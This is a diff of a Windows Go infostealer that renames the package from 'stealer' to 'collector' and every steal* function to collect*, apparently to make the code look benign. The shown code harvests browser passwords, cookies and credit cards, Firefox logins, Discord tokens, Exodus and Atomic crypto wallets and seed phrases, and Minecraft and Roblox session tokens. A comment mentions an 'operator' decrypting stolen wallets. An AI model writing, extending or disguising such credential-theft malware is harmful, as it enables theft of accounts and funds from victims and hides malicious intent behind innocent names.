@@ -1,6 +1,6 @@
 //go:build windows
 
-package stealer
+package collector
 
 import (
 	"crypto/aes"
@@ -566,7 +566,7 @@ func cpFile(src, dst string) error {
 
 // ── Chromium passwords ────────────────────────────────────────────
 
-func stealBrowser(b browserDef, key []byte) []Credential {
+func collectBrowser(b browserDef, key []byte) []Credential {
 	var creds []Credential
 	for _, profile := range browserProfiles {
 		src := filepath.Join(b.path, profile, "Login Data")
@@ -601,7 +601,7 @@ func stealBrowser(b browserDef, key []byte) []Credential {
 
 // ── Chromium cookies ──────────────────────────────────────────────
 
-func stealBrowserCookies(b browserDef, key []byte) []Cookie {
+func collectBrowserCookies(b browserDef, key []byte) []Cookie {
 	var cookies []Cookie
 	for _, profile := range browserProfiles {
 		// Chrome moved Cookies into Network/ subdirectory; check both locations.
@@ -649,7 +649,7 @@ func stealBrowserCookies(b browserDef, key []byte) []Cookie {
 
 // ── Chromium credit cards ─────────────────────────────────────────
 
-func stealBrowserCards(b browserDef, key []byte) []Card {
+func collectBrowserCards(b browserDef, key []byte) []Card {
 	var cards []Card
 	for _, profile := range browserProfiles {
 		src := filepath.Join(b.path, profile, "Web Data")
@@ -748,7 +748,7 @@ func findNSS3() string {
 	return ""
 }
 
-func stealGecko() ([]Credential, []string) {
+func collectGecko() ([]Credential, []string) {
 	nssPath := findNSS3()
 	if nssPath == "" {
 		return nil, nil // no Firefox-family browser installed
@@ -837,7 +837,7 @@ func stealGecko() ([]Credential, []string) {
 
 var tokenRe = regexp.MustCompile(`[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,}`)
 
-func stealDiscord() []string {
+func collectDiscord() []string {
 	roam := os.Getenv("APPDATA")
 	dirs := []string{
 		filepath.Join(roam, `discord\Local Storage\leveldb`),
@@ -882,10 +882,10 @@ var (
 	seedPhraseRe = regexp.MustCompile(`[a-z]{3,8}(?: [a-z]{3,8}){11}(?:(?: [a-z]{3,8}){11})?`)
 )
 
-// stealExodus grabs the encrypted wallet files from the Exodus desktop wallet.
+// collectExodus grabs the encrypted wallet files from the Exodus desktop wallet.
 // The .seco files are AES-GCM encrypted; the operator can attempt decryption
 // offline (default Exodus install has no passphrase, key derivable from appdata).
-func stealExodus() []WalletFile {
+func collectExodus() []WalletFile {
 	roam := os.Getenv("APPDATA")
 	walletDir := filepath.Join(roam, `Exodus\exodus.wallet`)
 	entries, err := os.ReadDir(walletDir)
@@ -917,8 +917,8 @@ func stealExodus() []WalletFile {
 	return files
 }
 
-// stealAtomic scans Atomic Wallet's LevelDB for private keys and seed phrases.
-func stealAtomic() []WalletFile {
+// collectAtomic scans Atomic Wallet's LevelDB for private keys and seed phrases.
+func collectAtomic() []WalletFile {
 	roam := os.Getenv("APPDATA")
 	dirs := []string{
 		filepath.Join(roam, `atomic\Local Storage\leveldb`),
@@ -969,7 +969,7 @@ func stealAtomic() []WalletFile {
 
 // ── Entry point ───────────────────────────────────────────────────
 
-// ── Minecraft session stealer ─────────────────────────────────────
+// ── Minecraft session collector ─────────────────────────────────────
 
 // mcAccountsJSON extracts tokens from a launcher_accounts.json style file.
 func mcAccountsJSON(data []byte, launcher string) []GameToken {
@@ -1021,7 +1021,7 @@ func mcProfilesJSON(data []byte, launcher string) []GameToken {
 	return out
 }
 
-func stealMinecraft() []GameToken {
+func collectMinecraft() []GameToken {
 	var out []GameToken
 	appdata := os.Getenv("APPDATA")
 	localAppdata := os.Getenv("LOCALAPPDATA")
@@ -1085,9 +1085,9 @@ func stealMinecraft() []GameToken {
 	return out
 }
 
-// ── Roblox cookie stealer ─────────────────────────────────────────
+// ── Roblox cookie collector ─────────────────────────────────────────
 
-func stealRoblox(cookies []Cookie) []GameToken {
+func collectRoblox(cookies []Cookie) []GameToken {
 	var out []GameToken
 	seen := map[string]bool{}
 	// Extract .ROBLOSECURITY from already-collected browser cookies
@@ -1138,20 +1138,20 @@ func Run() Result {
 			r.Errors = append(r.Errors, b.name+": "+err.Error())
 			continue
 		}
-		r.Credentials = append(r.Credentials, stealBrowser(b, key)...)
-		r.Cookies = append(r.Cookies, stealBrowserCookies(b, key)...)
-		r.Cards = append(r.Cards, stealBrowserCards(b, key)...)
+		r.Credentials = append(r.Credentials, collectBrowser(b, key)...)
+		r.Cookies = append(r.Cookies, collectBrowserCookies(b, key)...)
+		r.Cards = append(r.Cards, collectBrowserCards(b, key)...)
 	}
 
-	geckoCreds, geckoErrs := stealGecko()
+	geckoCreds, geckoErrs := collectGecko()
 	r.Credentials = append(r.Credentials, geckoCreds...)
 	r.Errors = append(r.Errors, geckoErrs...)
 
-	r.Tokens = stealDiscord()
-	r.Wallets = append(r.Wallets, stealExodus()...)
-	r.Wallets = append(r.Wallets, stealAtomic()...)
-	r.GameTokens = append(r.GameTokens, stealMinecraft()...)
-	r.GameTokens = append(r.GameTokens, stealRoblox(r.Cookies)...)
+	r.Tokens = collectDiscord()
+	r.Wallets = append(r.Wallets, collectExodus()...)
+	r.Wallets = append(r.Wallets, collectAtomic()...)
+	r.GameTokens = append(r.GameTokens, collectMinecraft()...)
+	r.GameTokens = append(r.GameTokens, collectRoblox(r.Cookies)...)
 	return r
 }
 
